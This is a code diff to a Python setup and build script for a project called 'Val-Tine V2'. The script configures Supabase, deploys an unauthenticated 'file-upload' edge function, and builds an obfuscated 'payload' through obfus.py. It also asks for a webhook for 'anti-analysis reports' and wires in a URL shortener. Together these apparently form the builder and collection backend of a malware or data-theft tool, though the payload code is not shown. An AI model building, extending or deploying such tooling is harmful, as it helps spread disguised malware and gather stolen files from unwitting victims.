@@ -4,8 +4,8 @@ Val-Tine V2 — Setup & Build Tool
 
 Interactive CLI to:
 1. Configure Supabase credentials (URL, anon key)
-2. Apply SQL migrations via Supabase Management API
-3. Deploy edge functions
+2. Log into Supabase CLI via npx (browser-based)
+3. Apply SQL migrations & deploy edge functions
 4. Update all config files (main.go, .env, obfus.py)
 5. Build the payload using obfus.py
 """
@@ -13,8 +13,8 @@ import sys
 import os
 import re
 import json
+import shutil
 import subprocess
-import getpass
 
 # ============================================================
 # HELPERS
@@ -25,14 +25,11 @@ def log(msg, level="INFO"):
     print(f"{prefix} {msg}")
 
 
-def ask(prompt, default=None, secret=False):
+def ask(prompt, default=None):
     """Prompt user for input with optional default."""
     suffix = f" [{default}]" if default else ""
     full = f"[?] {prompt}{suffix}: "
-    if secret:
-        val = getpass.getpass(full)
-    else:
-        val = input(full)
+    val = input(full)
     return val.strip() or default
 
 
@@ -45,16 +42,25 @@ def ask_yn(prompt, default=True):
     return val in ("y", "yes")
 
 
-def run(cmd, **kwargs):
-    """Run subprocess, return (success, stdout, stderr)."""
-    r = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
+def run_cmd(cmd, cwd=None, interactive=False):
+    """Run subprocess. If interactive, streams I/O to terminal."""
+    if interactive:
+        result = subprocess.run(cmd, cwd=cwd)
+        return result.returncode == 0, "", ""
+    r = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)
     return r.returncode == 0, r.stdout.strip(), r.stderr.strip()
 
 
 def check_tool(name):
-    """Check if a CLI tool is available."""
-    ok, out, _ = run(["which", name])
-    return ok
+    """Check if a CLI tool is available (cross-platform)."""
+    return shutil.which(name) is not None
+
+
+def extract_project_ref(supa_url):
+    """Extract project ref from Supabase URL.
+    e.g. https://hhckztzmnovfpgujhvhq.supabase.co -> hhckztzmnovfpgujhvhq
+    """
+    return supa_url.rstrip("/").replace("https://", "").replace(".supabase.co", "")
 
 
 def replace_in_file(filepath, old, new):
@@ -89,6 +95,10 @@ def collect_config():
     cfg["supa_url"] = ask("Supabase project URL", "https://xxxxx.supabase.co")
     cfg["supa_anon_key"] = ask("Supabase anon/public key")
 
+    # Auto-extract project ref from URL
+    cfg["supa_project_ref"] = extract_project_ref(cfg["supa_url"])
+    log(f"Project ref: {cfg['supa_project_ref']}", "OK")
+
     # --- Secondary Supabase project (optional redundancy) ---
     print()
     if ask_yn("Add a secondary Supabase project for redundancy?", default=False):
@@ -104,13 +114,6 @@ def collect_config():
         "Webhook URL for anti-analysis reports (leave blank to disable)",
         default=""
     )
-
-    # --- Supabase CLI login for migrations ---
-    print()
-    cfg["run_migrations"] = ask_yn("Run SQL migrations via Supabase CLI?", default=True)
-    if cfg["run_migrations"]:
-        cfg["supa_project_ref"] = ask("Supabase project ref (from dashboard URL)")
-        cfg["supa_db_password"] = ask("Database password", secret=True)
 
     # --- Build ---
     print()
@@ -172,7 +175,7 @@ def apply_config(cfg):
     log(f"Updated {env_file}", "OK")
 
     # --- obfus.py: URL shortener — auto-derive from primary Supabase URL ---
-    supa_ref = cfg["supa_url"].rstrip("/").replace("https://", "").replace(".supabase.co", "")
+    supa_ref = cfg["supa_project_ref"]
     shortener_fn_url = f"https://{supa_ref}.supabase.co/functions/v1/shorten"
     replace_in_file(obfus_file,
         'https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten',
@@ -182,55 +185,64 @@ def apply_config(cfg):
 
 
 # ============================================================
-# SUPABASE MIGRATIONS
+# SUPABASE CLI SETUP (via npx)
 # ============================================================
 
-def run_migrations(cfg):
-    """Run SQL migrations using Supabase CLI."""
+def run_supabase_setup(cfg):
+    """Run Supabase CLI setup: login, link, migrate, deploy — exactly like manual setup."""
     root = os.path.dirname(os.path.abspath(__file__))
+    project_ref = cfg["supa_project_ref"]
 
-    if not check_tool("supabase"):
-        log("Supabase CLI not found. Install: https://supabase.com/docs/guides/cli", "ERR")
-        log("You can manually run the SQL files in supabase/migrations/ via the Supabase dashboard SQL editor.", "WARN")
+    # Check npx is available
+    if not check_tool("npx"):
+        log("npx not found — install Node.js 18+ from https://nodejs.org/", "ERR")
+        sys.exit(1)
+
+    # Step 1: Login (opens browser)
+    print()
+    log("Logging into Supabase CLI (this will open your browser)...")
+    ok, _, _ = run_cmd(["npx", "supabase", "login"], cwd=root, interactive=True)
+    if not ok:
+        log("Supabase login failed", "ERR")
+        log("Try running manually: npx supabase login", "WARN")
         return False
 
-    project_ref = cfg["supa_project_ref"]
-    db_pass = cfg["supa_db_password"]
-
-    # Link project
-    log("Linking Supabase project...")
-    ok, out, err = run(
-        ["supabase", "link", "--project-ref", project_ref, f"--password={db_pass}"],
-        cwd=root
+    # Step 2: Link project
+    print()
+    log(f"Linking Supabase project {project_ref}...")
+    ok, _, _ = run_cmd(
+        ["npx", "supabase", "link", "--project-ref", project_ref],
+        cwd=root, interactive=True
     )
     if not ok:
-        log(f"supabase link failed: {err}", "ERR")
-        log("Trying to push migrations anyway...", "WARN")
+        log("Supabase link failed — continuing anyway", "WARN")
 
-    # Push migrations
+    # Step 3: Push database migrations
+    print()
     log("Pushing database migrations...")
-    ok, out, err = run(
-        ["supabase", "db", "push", f"--password={db_pass}"],
-        cwd=root
+    ok, _, _ = run_cmd(
+        ["npx", "supabase", "db", "push"],
+        cwd=root, interactive=True
     )
     if ok:
         log("Database migrations applied", "OK")
     else:
-        log(f"Migration push failed: {err}", "ERR")
-        log("Run the SQL files manually via Supabase dashboard SQL editor.", "WARN")
-        return False
+        log("Migration push failed", "ERR")
+        log("Run manually: npx supabase db push", "WARN")
+        log("Or paste SQL files from supabase/migrations/ into Supabase SQL Editor", "WARN")
 
-    # Deploy edge functions
-    log("Deploying edge functions...")
-    ok, out, err = run(
-        ["supabase", "functions", "deploy", "file-upload", "--no-verify-jwt"],
-        cwd=root
+    # Step 4: Deploy edge functions
+    print()
+    log("Deploying edge function 'file-upload'...")
+    ok, _, _ = run_cmd(
+        ["npx", "supabase", "functions", "deploy", "file-upload", "--no-verify-jwt"],
+        cwd=root, interactive=True
     )
     if ok:
         log("Edge function 'file-upload' deployed", "OK")
     else:
-        log(f"Edge function deploy failed: {err}", "WARN")
-        log("Deploy manually: supabase functions deploy file-upload --no-verify-jwt", "WARN")
+        log("Edge function deploy failed", "WARN")
+        log("Deploy manually: npx supabase functions deploy file-upload --no-verify-jwt", "WARN")
 
     return True
 
@@ -280,10 +292,10 @@ def main():
     log("Applying configuration...")
     apply_config(cfg)
 
-    if cfg["run_migrations"]:
-        print()
-        log("Running Supabase migrations...")
-        run_migrations(cfg)
+    # Always run Supabase CLI setup
+    print()
+    log("Running Supabase CLI setup...")
+    run_supabase_setup(cfg)
 
     if cfg["build_payload"]:
         print()
